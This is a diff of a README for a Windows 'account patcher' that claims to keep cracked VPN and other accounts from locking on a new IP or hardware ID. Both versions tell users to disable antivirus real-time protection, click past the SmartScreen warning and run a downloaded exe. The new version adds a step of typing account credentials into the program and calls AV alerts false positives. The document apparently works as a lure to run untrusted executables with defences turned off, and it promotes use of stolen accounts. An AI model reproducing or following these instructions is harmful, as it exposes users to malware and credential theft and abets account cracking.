@@ -1,13 +1,11 @@
-# NordVpn-Patcher
+# BOCHIDROP ACCOUNT PATCHER
 
-Program for patching cracked accounts from locking themselves when used from a new IP/HWID.
+Programs for patching cracked accounts from locking themselves when used from a new IP/HWID.
 
 # Steps
 
-* Turn off your Antivirus (if it asks you for how long you'd like it disabled, you can select a few minutes). You can disable your AV by going into the software and finding    settings. In the settings, turn off a setting called "Real-Time Protection".
-* Download the .exe (or master file) from this page.
-* Run NordPatcher by clicking on the file. If windows prompts you saying it protected your pc and asking if it should run the file, click "More info" followed by "Run anyway".
-* After running, you can delete the .exe and reenable your AV.
-* Login to https://my.nordaccount.com/login/ using the details given to you, and download NordVPN.
-* Follow install process and login with your account when prompted.
-* Enjoy!
+* Turn off your Antivirus (All cracking/hacking tools trigger AV's, but there are simply false positives.. You can disable your AV by going into the software and finding    settings. In the settings, turn off a feature called "Real-Time Protection".
+* Download the master file from this page.
+* Unzipthe file, and run PatcherManager by clicking on the exe. When it opens, enter the username and password information (separated with a colon, ex. johnsmith@gmail.com:abc123) into the textbox and click "Choose correct patcher and apply patch". It will open file explorer, and from there navigate to your downloads (or wherever you extracted the zip to) and select the correct patcher for what type of  account you've won.
+* After choosing the file and clicking "OK", you're set. If you'd like, you can now delete the patchers and patcher manager .exe's and reenable your AV.
+* Login to your account and enjoy!
